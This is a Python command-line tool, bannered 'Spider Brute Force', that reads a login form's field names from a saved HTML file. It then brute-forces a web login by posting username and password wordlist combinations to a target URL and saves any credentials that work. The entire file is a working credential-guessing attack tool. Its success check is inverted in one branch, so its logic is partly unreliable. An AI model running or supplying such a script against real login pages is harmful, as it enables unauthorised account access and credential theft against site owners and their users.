# Libraries
import optparse
import requests
import subprocess
from bs4 import BeautifulSoup

# Extract function to parse the HTML configuration file
def extract(config):
    with (open(config, "r") as configData) :
        file = configData.read()
        soup = BeautifulSoup(file, 'html.parser')
        global username_ , password_ , submit_
        username_ = soup.find('input', {'type': 'text'})['name']
        password_ = soup.find('input', {'type': 'password'})['name']
        #submit_ = soup.find('input', {'type': 'submit'})['name']
        data_ = {
            username_:"",
            password_ : '',
        }

        return data_

# Initialize the data dictionary
data = extract("config.txt")

# Parser for taking arguments from the user (terminal)
parser = optparse.OptionParser()
parser.add_option("-u", "--url", dest="url", help="Specify the URL", metavar="URL")
parser.add_option("-U", "--username", dest="username", help="Specify the username or username file")
parser.add_option("-p", "--password", dest="password", help="Specify the password or password file")
parser.add_option("-s", "--sign", dest="sign", help="Specify the success sign", metavar="SIGN")
parser.add_option("-o", "--output", dest="output", help="Specify the output file to save successful login")
options, args = parser.parse_args()



# Banner
def banner():
    logo = ''' 
    ┌─┐┌─┐┬┌┬┐┌─┐┬─┐  ┌┐ ┬─┐┬ ┬┌┬┐┌─┐  ┌─┐┌─┐┬─┐┌─┐┌─┐  
    └─┐├─┘│ ││├┤ ├┬┘  ├┴┐├┬┘│ │ │ ├┤   ├┤ │ │├┬┘│  ├┤   
    └─┘┴  ┴─┴┘└─┘┴└─  └─┘┴└─└─┘ ┴ └─┘  └  └─┘┴└─└─┘└─┘  '''
    print(logo)
    return

banner()

if not options.url or not options.username or not options.password or not options.sign:
    parser.error("[!] All options (-u, -U, -p, -s) are required.")

# Function to save username and password to a file
def save_to_file(output_path, content):
    try:
        with open(output_path, "w") as output_file:
            output_file.write(content)
        print(f"[+] File saved at {subprocess.getoutput('pwd')}/{output_path}")
    except Exception as Error:
        print(f"[!] Error saving to file: {Error}")

# Function to perform HTTP POST request
def perform_request(user, passwd):
    data[username_] = user
    data[password_] = passwd
    data["Login"] = "submit"
    try:
        req = requests.post(options.url, data=data)
        return req
    except requests.RequestException as Error:
        print(f"[!] Error during request: {Error}")
        return None

# Logic for handling username and password inputs
try:
    if options.username.endswith(".txt") and options.password.endswith(".txt"):
        with open(options.username) as username_list:
            for username in username_list:
                username = username.strip()
                with open(options.password) as password_list:
                    for password in password_list:
                        password = password.strip()
                        response = perform_request(username, password)
                        if response and options.sign not in response.text:
                            print("[*] Login Successfully")
                            print(f"[*] {username}:{password}")
                            if options.output:
                                save_to_file(options.output, f"{username}:{password}\n")
                            exit()
                        else:
                            print(f"[!] Failed Login: {username}:{password}")

    elif not options.username.endswith(".txt") and options.password.endswith(".txt"):
        with open(options.password) as password_list:
            for password in password_list:
                password = password.strip()
                response = perform_request(options.username, password)
                if response and options.sign in response.text:
                    print("[*] Login Successfully")
                    print(f"[*] {options.username}:{password}")
                    if options.output:
                        save_to_file(options.output, f"{options.username}:{password}\n")
                    exit()
                else:
                    print(f"[!] Failed attempt: {options.username}:{password}")

    elif not options.username.endswith(".txt") and not options.password.endswith(".txt"):
        response = perform_request(options.username, options.password)
        if response and options.sign in response.text:
            print("[*] Login Successfully")
            print(f"[*] {options.username}:{options.password}")
            if options.output:
                save_to_file(options.output, f"{options.username}:{options.password}\n")
        else:
            print("[!] Login failed.")

    else:
        print("[!] Invalid combination of inputs.")
except FileNotFoundError as e:
    print(f"[!] File not found: {e}")
except Exception as e:
    print(f"[!] Unexpected error: {e}")
